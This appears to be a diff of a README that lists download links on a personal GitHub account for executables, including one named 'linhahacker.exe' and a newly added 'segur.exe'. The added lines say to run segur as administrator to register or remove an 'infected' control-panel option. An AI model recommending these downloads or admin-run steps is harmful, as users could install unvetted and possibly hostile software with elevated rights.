@@ -14,3 +14,11 @@ Type https://limidadidou.github.io/files/download/password.html to obtain an fil
 Type https://github.com/limidadidou/files/releases/download/downloadcli/CLI-1.0.0.msi to obtain the command everthing
 
 Type https://github.com/limidadidou/files/releases/download/download/linhahacker.exe to obtain linhahacker
+
+Type https://limidadidou.github.io/files/download/segur.exe to obtain segur
+# Segur commands
+Open segur in administrator with the arguments:
+
+/registrar to register the option infected in the control panel
+
+/remover to remove the option infected in the control panel
